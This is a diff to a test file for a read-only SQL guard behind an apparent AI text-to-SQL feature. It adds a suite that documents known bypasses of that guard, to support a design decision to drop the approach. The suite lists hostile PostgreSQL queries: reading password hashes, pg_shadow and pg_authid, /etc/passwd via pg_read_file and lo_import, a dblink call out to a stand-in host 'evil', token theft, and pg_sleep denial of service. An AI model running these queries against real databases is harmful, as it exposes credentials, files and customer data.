@@ -66,6 +66,10 @@ describe("denied tables — read-only is not the same as harmless", () => {
     for (const sql of [
       'SELECT COUNT(*) FROM "SalesOrder"',
       'SELECT "firstName" FROM "Customer" WHERE id = 1',
+      // NOTE: "StaffMember" was listed here as a business table. It carries
+      // `passwordHash` (schema.prisma:2885) -- see the bypass suite below.
+      // Kept allowed on purpose: "fixing" this one row would suggest the guard
+      // is sound, and it is not.
       'SELECT * FROM "StaffMember"',
     ]) {
       expect(isReadOnly(sql)).toBe(true);
@@ -95,5 +99,51 @@ describe("denied tables — read-only is not the same as harmless", () => {
     for (const table of DENIED_TABLES) {
       expect(schema).toMatch(new RegExp(`^model ${table} \\{`, "m"));
     }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// KNOWN BYPASSES — this guard is NOT sufficient, and these assert that.
+//
+// Every case below is ALLOWED by the guard above. They are asserted as allowed
+// on purpose: this file is the evidence for why text-to-SQL was abandoned
+// (docs/ai-assistant-design.md §2.1), and a suite that quietly patched a few of
+// them would imply the rest are covered. They are not.
+//
+// The guard is a denylist over an unbounded grammar. Tables are checked;
+// functions, catalogs, aggregates and SQL-inside-a-literal are not. The
+// replacement design removes the grammar rather than filtering it — the model
+// picks an id from a fixed catalog and fills typed args, and no SQL exists.
+//
+// If one of these starts FAILING, someone has begun hardening this path. Read
+// the design doc first: hardening it is not the plan.
+// ---------------------------------------------------------------------------
+describe("known bypasses — why this path is being deleted, not hardened", () => {
+  const BYPASSES: [string, string][] = [
+    [
+      "staff password hashes (passwordHash is on StaffMember, not User)",
+      'SELECT email, "passwordHash" FROM "StaffMember"',
+    ],
+    [
+      "SQL inside a literal — the false-positive fix IS the bypass",
+      `SELECT query_to_xml('SELECT * FROM "IntegrationCredential"', true, true, '')`,
+    ],
+    ["catalog, unqualified", "SELECT * FROM pg_shadow"],
+    ["catalog, whitespace-qualified", "SELECT * FROM pg_catalog . pg_shadow"],
+    ["role passwords", "SELECT rolname, rolpassword FROM pg_authid"],
+    ["filesystem read (a function, not a table)", "SELECT pg_read_file('/etc/passwd')"],
+    ["a WRITE, inside a SELECT", "SELECT lo_import('/etc/passwd')"],
+    ["outbound egress", `SELECT * FROM dblink('host=evil','SELECT 1') AS t(x int)`],
+    ["ticket capability token", 'SELECT "publicToken" FROM "Ticket"'],
+    ["customer portal capability token", 'SELECT "portalToken" FROM "Return"'],
+    [
+      "whole customer list in one cell — defeats the LIMIT cap",
+      `SELECT string_agg(email, ',') FROM "Customer"`,
+    ],
+    ["denial of service", "SELECT pg_sleep(10)"],
+  ];
+
+  it.each(BYPASSES)("ALLOWED (documented hole): %s", (_name, sql) => {
+    expect(isReadOnly(sql)).toBe(true);
   });
 });
